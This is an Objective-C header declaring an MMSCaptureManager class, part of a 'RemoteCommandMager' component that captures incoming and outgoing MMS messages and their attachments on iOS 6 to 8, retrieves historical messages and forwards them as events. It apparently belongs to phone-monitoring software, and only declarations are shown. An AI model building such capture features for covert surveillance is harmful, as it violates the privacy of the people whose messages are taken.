/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  MMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "EventDelegate.h"
#import "MessagePortIPCReader.h"

@protocol TelephonyNotificationManager;
@class MMSNotifier;
@class MMSCaptureUtils;

/*
 iOS 6 - OUTGOING
 - MMSNotifier --> dataDidReceivedFromMessagePort
 - MMSNotifier --> createMMSEvent
 - MMSCaptureDAO --> selectMMSEvents
 - MMSCaptureManger --> mmsEventDidFinish
 - MMSCaptureManger --> contactWithMMSEvent
 
 iOS 7,8 - OUTGOING
 - MMSNotifier --> messageSent
 - MMSNotifier --> createMMSEvent
 - MMSCaptureDAO --> selectMMSEvents
 - MMSCaptureManger --> mmsEventsDidFinish
 - MMSCaptureManger --> contactWithMMSEvent
 - MMSCaptureManger --> flashMMSEvent
 
 iOS 6,7,8 - INCOMING
 - MMSNotifier --> messageRecieved
 - MMSCaptureMananager --> createMMSEvents
 - MMSCaptureDAO --> selectMMSEvents
 - MMSCaptureManager --> mmsEventsDidFinish
 - MMSCaptureManager --> contactWithMMSEvent
 - MMSCaptureManager --> flush
 */


@interface MMSCaptureManager : NSObject <MessagePortIPCDelegate> {
@private
	// For creating an instance of MessagePortIPCReader
    MessagePortIPCReader*	mMessagePortIPCReader; 
	id <EventDelegate>		mEventDelegate;
	NSString				*mMMSAttachmentPath;
	MMSCaptureUtils			*mMMSUtils;
	
	// IOS 6,7,8
	NSMutableArray		*mMMSEventPool;
	MMSNotifier			*mMMSNotifier;
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
}

@property (nonatomic, copy) NSString *mMMSAttachmentPath;
@property (nonatomic, assign) id <TelephonyNotificationManager> mTelephonyNotificationManager;

// For Sending event to Event Delivery manager
- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;

// These methods for controlling MMS capture
- (void) startCapture;
- (void) stopCapture;

- (void) prepareForRelease;

// -- Historical MMS

+ (NSArray *) allMMSs;
+ (NSArray *) allMMSsWithMax: (NSInteger) aMaxNumber;


@end
